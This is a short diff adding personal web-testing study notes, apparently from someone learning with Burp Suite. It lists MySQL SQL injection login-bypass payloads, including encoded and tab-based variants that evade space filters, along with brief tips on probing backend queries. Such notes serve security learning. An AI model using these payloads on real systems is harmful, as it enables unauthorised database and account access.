@@ -1,0 +1,19 @@
+
+
+Tips for myself
+=================
+
+	- Don't hit and trial in repeater for payload to get inject. Hit and trial to identify what could be the script code running on the backend.
+
+MySQL Payloads
+--------------
+
+	' or 1=1 --
+	' or 1=1 --<space>
+	'||1#
+	'||'1'='1
+	%27%09OR%091%3D1%09--%09 <To bypass no space but use of \t(0x09)> 
+	'||1=1# <If no space and no tabs allowed
+
+
+Note: Selecting a part in burp's decoder and then decoding/encoding in burp... only decodes/encodes that part of the string.
